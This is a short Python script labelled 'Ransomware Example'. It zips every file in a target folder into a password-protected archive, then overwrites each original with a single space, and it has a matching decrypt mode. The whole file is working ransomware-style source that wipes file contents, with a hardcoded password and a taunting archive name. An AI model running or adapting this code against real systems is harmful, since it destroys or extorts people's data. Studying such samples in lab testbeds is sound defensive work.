import argparse
import os
import pyminizip
import shutil


def archive_and_encrypt(testbed_folder):
    try:
        filesToArchive = []
        for root, dirs, files in os.walk(testbed_folder):
            for file in files:
                if file != encrypt_holder_file:
                    filesToArchive.append(root + "\\" + file)

        print(f"Files to archive: {filesToArchive}")
        pyminizip.compress_multiple(
            filesToArchive,
            [],
            encrypt_holder_file,
            "parola",
            1,
        )

        print(f"Archive created successfully: {encrypt_holder_file}")

        for root, dirs, files in os.walk(testbed_folder):
            for file in files:
                if file != encrypt_holder_file:
                    file = root + "\\" + file
                    with open(file, "w") as f:
                        f.write(" ")

    except Exception as e:
        print(f"Error: {e}")


def dearchive(testbed_folder):
    old_cwd = os.getcwd()
    pyminizip.uncompress(encrypt_holder_file, "parola", testbed_folder, 0)
    os.remove(old_cwd + "\\" + encrypt_holder_file)


encryption_key = "BeammersClubFuckedYou"  # Replace this with your encryption key
encrypt_holder_file = "BeammersClubFuckedYou.zip"


def main():
    parser = argparse.ArgumentParser(description="Ransomware Example")

    parser.add_argument(
        "--mode",
        choices=["encrypt", "decrypt"],
        required=True,
        help="Encryption or decryption mode",
    )
    parser.add_argument(
        "--testbed",
        required=True,
        nargs="?",
        help="Folder to be attacked and encrypted/decrypted",
    )
    parser.add_argument(
        "--buffer_file",
        required=True,
        nargs="?",
        help="File for storing ransomware metadata",
    )

    args = parser.parse_args()

    mode = args.mode
    testbed = args.testbed

    if mode == "encrypt":
        archive_and_encrypt(testbed)
    elif mode == "decrypt":
        dearchive(testbed)


if __name__ == "__main__":
    main()
